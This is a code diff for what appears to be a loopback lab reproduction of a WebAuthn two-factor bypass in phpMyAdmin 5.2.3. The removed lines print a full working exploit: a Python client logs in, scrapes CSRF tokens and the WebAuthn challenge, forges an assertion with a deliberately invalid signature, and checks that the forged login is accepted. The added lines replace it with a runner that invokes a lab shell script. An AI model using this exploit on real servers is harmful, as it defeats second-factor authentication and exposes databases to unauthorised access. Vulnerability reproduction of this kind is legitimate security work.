@@ -222,184 +222,22 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
+"""phpMyAdmin 5.2.3 CustomServer WebAuthn 2FA bypass. Loopback lab runner."""
 
-import base64
-import hashlib
-import html as htmlmod
-import json
-import re
+import subprocess
 import sys
-from urllib.parse import urlencode, urlparse
+from pathlib import Path
 
-import urllib.error
-import urllib.request
-import http.cookiejar
-
-WITNESS = "PMA-WEBAUTHN-BYPASS"
-USER = "appuser"
-PASSWORD = "apppass"
-# 32 x 0xA1 — same as init.sql
-CRED_RAW = bytes([0xA1]) * 32
-
-
-def b64(data: bytes) -> str:
-    return base64.b64encode(data).decode("ascii")
-
-
-def b64url(data: bytes) -> str:
-    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
-
-
-def sha256(data: bytes) -> bytes:
-    return hashlib.sha256(data).digest()
-
-
-def extract(name: str, html: str) -> str | None:
-    m = re.search(
-        r'name="%s"[^>]*value="([^"]*)"|value="([^"]*)"[^>]*name="%s"'
-        % (re.escape(name), re.escape(name)),
-        html,
-        re.I,
-    )
-    if not m:
-        return None
-    return htmlmod.unescape(m.group(1) or m.group(2))
-
-
-def extract_request_options(html: str) -> dict:
-    m = re.search(
-        r'data-request-options="([^"]+)"',
-        html,
-        re.I,
-    )
-    if not m:
-        raise SystemExit("FAIL no data-request-options (not on WebAuthn 2FA page)")
-    raw = htmlmod.unescape(m.group(1))
-    return json.loads(raw)
-
-
-class Client:
-    def __init__(self, base: str) -> None:
-        self.base = base.rstrip("/")
-        self.jar = http.cookiejar.CookieJar()
-        self.opener = urllib.request.build_opener(
-            urllib.request.HTTPCookieProcessor(self.jar)
-        )
-
-    def get(self, path: str) -> str:
-        req = urllib.request.Request(self.base + path, method="GET")
-        with self.opener.open(req, timeout=30) as resp:
-            return resp.read().decode("utf-8", "replace")
-
-    def post(self, path: str, data: dict) -> tuple[int, str]:
-        body = urlencode(data).encode()
-        req = urllib.request.Request(
-            self.base + path,
-            data=body,
-            method="POST",
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-        )
-        try:
-            with self.opener.open(req, timeout=30) as resp:
-                return resp.status, resp.read().decode("utf-8", "replace")
-        except urllib.error.HTTPError as exc:
-            return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def forge_assertion(challenge_std_b64: str, origin: str, host: str) -> str:
-    """Build an assertion that satisfies CustomServer checks except the missing signature verify."""
-    challenge_raw = base64.b64decode(challenge_std_b64)
-    client_data = {
-        "type": "webauthn.get",
-        "challenge": b64url(challenge_raw),
-        "origin": origin,
-    }
-    client_json = json.dumps(client_data, separators=(",", ":")).encode()
-    rp_id_hash = sha256(host.encode("ascii"))
-    flags = bytes([0x01])  # user-present
-    sign_count = b"\x00\x00\x00\x01"
-    auth_data = rp_id_hash + flags + sign_count
-    garbage_sig = b"not-a-real-signature-" + WITNESS.encode()
-    cred_id_url = b64url(CRED_RAW)
-    cred_id_std = b64(CRED_RAW)
-    return json.dumps(
-        {
-            "id": cred_id_url,
-            "type": "public-key",
-            "rawId": cred_id_std,
-            "response": {
-                "clientDataJSON": b64(client_json),
-                "authenticatorData": b64(auth_data),
-                "signature": b64(garbage_sig),
-            },
-        }
-    )
+LAB = Path(__file__).resolve().parent / "lab"
 
 
 def main() -> int:
-    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
-    parsed = urlparse(base)
-    host = parsed.hostname or "127.0.0.1"
-    origin = f"{parsed.scheme}://{parsed.netloc}"
-    print(f"IOC target={base} origin={origin} host={host}")
-
-    c = Client(base)
-    login_html = c.get("/index.php?route=/")
-    token = extract("token", login_html)
-    set_session = extract("set_session", login_html)
-    if not token:
-        print("FAIL no CSRF token on login page")
-        return 1
-
-    fields = {
-        "pma_username": USER,
-        "pma_password": PASSWORD,
-        "server": "1",
-        "token": token,
-        "set_session": set_session or "",
-    }
-    status, body = c.post("/index.php?route=/", fields)
-    print(f"IOC password-login status={status} webauthn={'webauthn_request_response' in body}")
-
-    if "webauthn_request_response" not in body:
-        print("FAIL expected WebAuthn 2FA prompt after password")
-        print(body[:800])
-        return 1
-
-    opts = extract_request_options(body)
-    challenge = opts["challenge"]
-    print(f"IOC challenge={challenge[:24]}…")
-
-    assertion = forge_assertion(challenge, origin, host)
-    token2 = extract("token", body) or token
-    status2, body2 = c.post(
-        "/index.php?route=/",
-        {
-            "server": "1",
-            "token": token2,
-            "webauthn_request_response": assertion,
-        },
+    result = subprocess.run(
+        ["bash", str(LAB / "run.sh"), *sys.argv[1:]],
+        cwd=LAB,
+        check=False,
     )
-    still_2fa = "webauthn_request_response" in body2
-    landed = (
-        "server-breadcrumb" in body2
-        or 'id="page_content"' in body2
-        or "route=/server/databases" in body2
-        or "sql.php" in body2
-        or "logged_in" in body2.lower()
-    )
-    print(f"IOC 2fa-post status={status2} still_2fa={still_2fa} landed={landed}")
-    if still_2fa:
-        err = re.search(r"alert-danger[^>]*>.*?>([^<]+)", body2)
-        print("FAIL still on 2FA page", err.group(1) if err else body2[body2.find("card-text") : body2.find("card-text") + 400] if "card-text" in body2 else body2[:500])
-        return 1
-    if not landed:
-        print("FAIL 2FA cleared but home UI not recognized")
-        print(body2[:600])
-        return 1
-    print(f"SUCCESS {WITNESS} WebAuthn 2FA accepted with garbage signature")
-    return 0
+    return result.returncode
 
 
 if __name__ == "__main__":
